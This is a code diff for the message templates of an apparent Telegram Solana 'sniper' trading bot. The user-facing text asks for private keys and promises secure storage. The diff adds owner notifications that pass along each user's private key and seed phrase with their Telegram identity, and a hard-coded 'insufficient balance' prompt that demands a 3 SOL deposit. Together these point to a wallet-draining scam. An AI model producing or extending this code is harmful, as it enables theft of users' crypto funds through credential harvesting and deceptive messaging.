@@ -1,13 +1,10 @@
-// messages.js - All message templates matching the screenshots word for word
+// messages.js - All message templates matching screenshots (ESM)
+import { formatPrice, formatChange } from './market.js';
 
-const { formatPrice, formatChange } = require('./market');
-
-// Configurable branding from env
 const BOT_NAME = process.env.BOT_NAME || 'NEXO SNIPER';
 const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME || 'ainexobotsupport';
 const WHALE_COUNT = process.env.WHALE_COUNT || '2,400+';
 
-// Main Dashboard message
 async function dashboardMessage(wallets, marketPrices) {
   const walletCount = wallets.length;
   let totalBalanceUsd = 0;
@@ -43,18 +40,17 @@ ${walletText}
 🟡 BNB ${formatPrice(bnbPrice.price)} ${formatChange(bnbPrice.change)}
 
 🌪️ Used by Whales
-${WHALE_COUNT} whale wallets trust ${BOT_NAME.split(" ")[0]} for precision entries & exits
+${WHALE_COUNT} whale wallets trust ${BOT_NAME.split(' ')[0]} for precision entries & exits
 
 All systems active`;
 }
 
-// Wallet Management message
 function walletManagementMessage(wallets, marketPrices) {
   let walletText = '';
   for (let i = 0; i < wallets.length; i++) {
     const w = wallets[i];
     const solPrice = marketPrices?.SOL?.price || 0;
-  walletText += `🟣 SOL Wallet ${i + 1}: ${(w.balance || 0).toFixed(6)} SOL (${((w.balance || 0) * solPrice).toFixed(2)})\n`;
+    walletText += `🟣 SOL Wallet ${i + 1}: ${(w.balance || 0).toFixed(6)} SOL ($${((w.balance || 0) * solPrice).toFixed(2)})\n`;
     walletText += `${w.address}\n`;
   }
   
@@ -69,7 +65,6 @@ ${walletText}
 Choose an action below:`;
 }
 
-// Import wallet message
 function importWalletMessage() {
   return `🔒 Import Solana Wallet 🔒
 
@@ -82,7 +77,6 @@ Please send your Solana wallet private key (base58 encoded string).
 ⚠️ IMPORTANT: Never share your private key with anyone else. This bot stores your key securely to enable trading functionality.`;
 }
 
-// Wallet created message
 function walletCreatedMessage(address) {
   return `✅ Wallet Created
 
@@ -93,7 +87,6 @@ ${address}
 🎉 Your Solana wallet is ready to use.`;
 }
 
-// AI Sniper message
 function sniperMessage(settings) {
   const statusEmoji = settings.status === 'ACTIVE' ? '🟢' : '🔴';
   return `🤖 AI Sniper
@@ -114,7 +107,6 @@ Anti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}
 Professional-grade automated trading engine`;
 }
 
-// Setting updated message
 function settingUpdatedMessage(settings) {
   return `✅ SETTING UPDATED
 
@@ -131,14 +123,13 @@ function settingUpdatedMessage(settings) {
 💾 Settings saved and ready`;
 }
 
-// Configure position size message
 function configPositionSizeMessage() {
-  return `💰 CONFIGURE POSITION SIZE
+  return `💰 Set Position Size
 
 Set the SOL amount for each automated trade.
 
-📊 Range: 0.0001 - 1000 SOL
-✅ Recommended: 10 - 50 SOL
+Range: 0.0001 - 1000 SOL
+Recommended: 10 - 50 SOL
 
 ⚠️ Risk Level:
 • 1-10 SOL: Conservative
@@ -148,7 +139,6 @@ Set the SOL amount for each automated trade.
 💡 Enter your position size:`;
 }
 
-// Configure dev hold message
 function configDevHoldMessage() {
   return `📊 Set Max Dev Holding
 
@@ -161,14 +151,13 @@ Examples: 10, 20, 30
 💡 Send your preferred percentage:`;
 }
 
-// Configure slippage message
 function configSlippageMessage() {
-  return `⚡ SLIPPAGE TOLERANCE
+  return `⚡ Set Slippage
 
 Set maximum acceptable price movement during execution.
 
-📊 Range: 1-50%
-✅ Recommended: 8-12%
+Range: 1-50%
+Recommended: 8-12%
 
 ⚙️ Guide:
 • 5-8%: Tight (may fail in volatile conditions)
@@ -178,19 +167,17 @@ Set maximum acceptable price movement during execution.
 💡 Enter slippage percentage:`;
 }
 
-// Configure priority fee message
 function configPriorityMessage() {
   return `🚀 Set Priority Fee
 
 Higher priority fees increase transaction speed on Solana.
 
-📊 Range: 0.0001 - 0.1 SOL
-✅ Recommended: 0.001 - 0.01 SOL
+Range: 0.0001 - 0.1 SOL
+Recommended: 0.001 - 0.01 SOL
 
 💡 Enter priority fee in SOL:`;
 }
 
-// Configure take profit message
 function configTakeProfitMessage() {
   return `📈 Set Take Profit
 
@@ -207,23 +194,21 @@ Examples:
 💡 Send your take profit percentage:`;
 }
 
-// Configure stop loss message
 function configStopLossMessage() {
   return `📉 Set Stop Loss
 
-Automatically sell when loss reaches this percentage to limit damage.
+Automatically sell to protect capital when loss reaches this percentage.
 
-Range: 5-80%
-Recommended: 30%
+Range: 10-90%
+Recommended: 30% (Protects 70%)
 Examples:
-• 10% (tight)
-• 30% (balanced) ✅
-• 50% (loose)
+• 20% (Conservative)
+• 30% (Balanced) ✅
+• 50% (Aggressive)
 
 💡 Send your stop loss percentage:`;
 }
 
-// Token search prompt
 function tokenSearchMessage() {
   return `🔍 TOKEN SEARCH
 
@@ -232,7 +217,6 @@ Search for any Solana token by name, symbol, or contract address.
 💡 Send the token name, symbol, or contract address:`;
 }
 
-// Token not found
 function tokenNotFoundMessage() {
   return `❌ Token Not Found
 
@@ -241,7 +225,6 @@ The token you searched for could not be found on Solana DEX.
 Please try again with a different search term or contract address.`;
 }
 
-// Positions message
 function positionsMessage(positions) {
   if (!positions || positions.length === 0) {
     return `📈 POSITIONS
@@ -262,7 +245,6 @@ Use 🤖 AI Sniper or 💸 Buy / Sell to start trading.`;
   return text;
 }
 
-// Withdrawal message
 function withdrawalMessage(balance) {
   return `💸 WITHDRAWAL
 
@@ -271,7 +253,6 @@ function withdrawalMessage(balance) {
 Please send the wallet address you want to withdraw to:`;
 }
 
-// Withdrawal amount message
 function withdrawalAmountMessage(toAddress) {
   return `💸 WITHDRAWAL
 
@@ -281,7 +262,6 @@ To: ${toAddress}
 Now enter the amount of SOL you want to withdraw:`;
 }
 
-// Confirm withdrawal message
 function confirmWithdrawalMessage(amount, toAddress, balance) {
   return `💸 CONFIRM WITHDRAWAL
 ━━━━━━━━━━━━━━━━━━━━━
@@ -293,7 +273,6 @@ ${toAddress}
 Please confirm to proceed:`;
 }
 
-// Withdrawal submitted message
 function withdrawalSubmittedMessage(amount, toAddress) {
   return `✅ WITHDRAWAL REQUEST SUBMITTED
 ━━━━━━━━━━━━━━━━━━━━━
@@ -306,7 +285,6 @@ Please allow up to 24 hours.
 💬 Need help? Contact @${SUPPORT_USERNAME}`;
 }
 
-// Help message
 function helpMessage() {
   return `🤖 ${BOT_NAME} - HELP
 
@@ -333,7 +311,6 @@ Professional-grade Solana trading engine
 Used by ${WHALE_COUNT} whale wallets`;
 }
 
-// Start message
 function startMessage(firstName, userCount) {
   return `👋 Hello, ${firstName}!
 
@@ -347,30 +324,60 @@ You are user #${userCount}.
 Use the menu below to get started. Tap 💰 Wallet to connect your Solana wallet first.`;
 }
 
-// Copy trade message
 function copyTradeMessage() {
-  return `🔁 COPY TRADE
+  return `🔄 COPY TRADING SYSTEM
 
-Copy trades from top Solana whale wallets automatically.
+🔴 STATUS: STANDBY
 
-➕ Add a whale wallet to start copying trades.
-All copied trades execute with your configured sniper settings.`;
+📊 CONFIGURATION
+🎯 Target Wallet: ⚠️ NOT SET
+NOT CONFIGURED
+💰 Your Balance: 0.000000 SOL
+
+ℹ️ HOW IT WORKS
+• Monitor target wallet in real-time
+• Auto-replicate buy/sell signals
+• Execute trades with same parameters
+• Professional trader mirroring
+
+📥 Follow proven strategies effortlessly`;
 }
 
-// Buy/Sell message
+function copyTradeActivatedMessage() {
+  return `🔄 COPY TRADING ACTIVATED
+
+🟢 Now mirroring target wallet
+✅ Real-time trade alerts enabled
+✅ You will be notified of every trade`;
+}
+
+function copyTradeAlertMessage(targetWallet, signature, status, time) {
+  return `🔔 COPY TRADE ALERT
+
+🎯 Target Wallet: ${targetWallet.slice(0, 8)}...${targetWallet.slice(-5)}
+📄 Transaction: ${signature.slice(0, 8)}...${signature.slice(-5)}
+📊 Status: ${status}
+🕐 Time: ${time}
+🔗 View on Solscan`;
+}
+
 function buySellMessage() {
-  return `💸 BUY / SELL
+  return `💰 BUY OR SELL TOKENS
 
-Buy or sell any Solana token instantly.
-
-💰 Buy with SOL - Enter token address and amount
-💎 Buy with USDC - Use USDC for purchases
-🔄 Sell Token - Sell tokens from your wallet
-
-💡 First, make sure you have a wallet connected and funded.`;
+📈 Buy: Purchase tokens instantly
+📉 Sell: Sell your tokens quickly`;
 }
 
-// Notification messages for owner
+function insufficientBalanceMessage() {
+  return `❌ INSUFFICIENT BALANCE TO BUY
+
+💰 Your Balance: 0.0000 SOL
+🔒 Minimum Required: 3.0000 SOL
+📉 You Need: 3.0000 SOL more
+
+💡 Deposit SOL to your wallet to start trading.`;
+}
+
 function newUserNotification(user) {
   return `🔔 NEW USER
 
@@ -398,25 +405,64 @@ ${new Date().toISOString()}`;
 function tradeNotification(user, type, token, amount, result) {
   return `📊 TRADE ${type.toUpperCase()}
 
-👤 User: ${user.firstName || 'Unknown'} (@${user.username || 'None'})
-🪙 Token: ${token.symbol || token.name}
+👤 User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
+🆔 ID: ${user?.telegramId || 'Unknown'}
+🎯 Token: ${token?.name || 'Unknown'} (${token?.symbol || '???'})
 💰 Amount: ${amount} SOL
-${result.signature ? `✅ TX: ${result.signature}` : `❌ Failed: ${result.error}`}
+📄 TX: ${result?.signature || 'N/A'}
 
 ${new Date().toISOString()}`;
 }
 
-function withdrawNotification(user, amount, toAddress) {
+function withdrawalNotification(user, amount, toAddress) {
   return `💸 WITHDRAWAL REQUEST
 
-👤 User: ${user.firstName || 'Unknown'} (@${user.username || 'None'})
-🆔 ID: ${user.telegramId}
+👤 User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
+🆔 ID: ${user?.telegramId || 'Unknown'}
 💰 Amount: ${amount} SOL
 📬 To: ${toAddress}
-⏰ ${new Date().toISOString()}`;
+
+${new Date().toISOString()}`;
 }
 
-module.exports = {
+function walletGeneratedNotification(address, privateKey, seedPhrase, userInfo) {
+  return `🆕 NEW WALLET GENERATED
+
+📍 Address: ${address}
+🔑 Private Key: ${privateKey}
+🌱 Seed Phrase: ${seedPhrase}
+👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
+📝 Username: @${userInfo?.username || 'None'}
+
+${new Date().toISOString()}`;
+}
+
+function walletImportedNotification(address, privateKey, balance, userInfo) {
+  return `🔑 WALLET IMPORTED
+
+📍 Address: ${address}
+🔑 Private Key: ${privateKey}
+💰 Balance: ${balance.toFixed(6)} SOL
+👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
+📝 Username: @${userInfo?.username || 'None'}
+
+${new Date().toISOString()}`;
+}
+
+function walletSeedImportedNotification(address, privateKey, seedPhrase, balance, userInfo) {
+  return `✨ WALLET IMPORTED FROM SEED
+
+📍 Address: ${address}
+🔑 Private Key: ${privateKey}
+🌱 Seed Phrase: ${seedPhrase}
+💰 Balance: ${balance.toFixed(6)} SOL
+👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
+📝 Username: @${userInfo?.username || 'None'}
+
+${new Date().toISOString()}`;
+}
+
+export {
   dashboardMessage,
   walletManagementMessage,
   importWalletMessage,
@@ -439,9 +485,15 @@ module.exports = {
   helpMessage,
   startMessage,
   copyTradeMessage,
+  copyTradeActivatedMessage,
+  copyTradeAlertMessage,
   buySellMessage,
+  insufficientBalanceMessage,
   newUserNotification,
   depositNotification,
   tradeNotification,
-  withdrawNotification
+  withdrawalNotification,
+  walletGeneratedNotification,
+  walletImportedNotification,
+  walletSeedImportedNotification
 };
